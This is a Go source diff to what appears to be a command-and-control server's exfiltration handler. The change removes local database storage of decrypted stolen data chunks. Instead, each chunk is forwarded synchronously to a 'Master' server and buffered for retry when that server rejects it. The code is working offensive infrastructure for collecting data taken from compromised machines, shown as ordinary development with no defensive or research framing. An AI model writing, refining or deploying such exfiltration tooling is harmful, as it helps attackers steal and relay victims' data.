@@ -809,47 +809,29 @@ func (c2 *C2Manager) handleExfilDataFrame(frame *ExfilFrame, clientIP string) (b
 			if decryptErr == nil {
 				payloadB64 := base64.StdEncoding.EncodeToString(plaintext)
 				
-				// IMPORTANT: Store locally BEFORE forwarding to Master for recovery capability
-				// Use tag as session identifier since we don't have the full session ID yet
-				localStored := false
-				if c2.db != nil {
-					tagSessionID := fmt.Sprintf("tag_%s", frame.SessionTag)
-					if _, dbErr := c2.db.RecordExfilChunk(tagSessionID, frame.Counter, plaintext); dbErr != nil {
-						logf("[Exfil] Local storage failed for orphan chunk tag=%s idx=%d: %v", frame.SessionTag, frame.Counter, dbErr)
-					} else {
-						localStored = true
-						if c2.debug {
-							logf("[Exfil] Stored orphan chunk locally tag=%s idx=%d bytes=%d", frame.SessionTag, frame.Counter, len(plaintext))
-						}
+				// Try to forward to Master - if tag isn't registered yet, buffer for retry
+				completed, err := masterClient.SubmitExfilChunkByTag(frame.SessionTag, int(frame.Counter), payloadB64)
+				if err == nil {
+					if c2.debug {
+						logf("[Exfil] Forwarded orphan chunk tag=%s idx=%d to Master", frame.SessionTag, frame.Counter)
 					}
-				}
-				
-				// Forward to Master asynchronously
-				go func() {
-					completed, err := masterClient.SubmitExfilChunkByTag(frame.SessionTag, int(frame.Counter), payloadB64)
-					if err == nil {
-						if c2.debug {
-							logf("[Exfil] Forwarded orphan chunk tag=%s idx=%d to Master", frame.SessionTag, frame.Counter)
-						}
-						if completed && c2.debug {
-							logf("[Exfil] Master signaled session for tag %s is complete", frame.SessionTag)
-						}
-					} else if c2.debug {
-						logf("[Exfil] Failed to forward orphan chunk tag=%s: %v", frame.SessionTag, err)
+					if completed && c2.debug {
+						logf("[Exfil] Master signaled session for tag %s is complete", frame.SessionTag)
 					}
-				}()
-				
-				// ACK based on local storage success, not Master (async)
-				if localStored {
 					return true, nil
 				}
-				// If local storage failed, NACK to trigger retry
-				return false, fmt.Errorf("local storage failed for orphan chunk")
+				
+				// If Master rejected (tag not found), buffer the chunk for retry
+				// Don't create local sessions with tag_ prefix - this causes duplicate UI entries
+				if c2.debug {
+					logf("[Exfil] Master rejected orphan chunk tag=%s idx=%d: %v - buffering for retry", frame.SessionTag, frame.Counter, err)
+				}
 			} else if c2.debug {
 				logf("[Exfil] Failed to decrypt orphan chunk tag=%s: %v - buffering", frame.SessionTag, decryptErr)
 			}
 		}
 
+		// Buffer the chunk - it will be processed when metadata arrives
 		c2.enqueuePendingLabelChunk(frame, clientIP)
 		if c2.debug {
 			logf("[Exfil] buffered frame tag=%s idx=%d awaiting metadata", frame.SessionTag, frame.Counter)
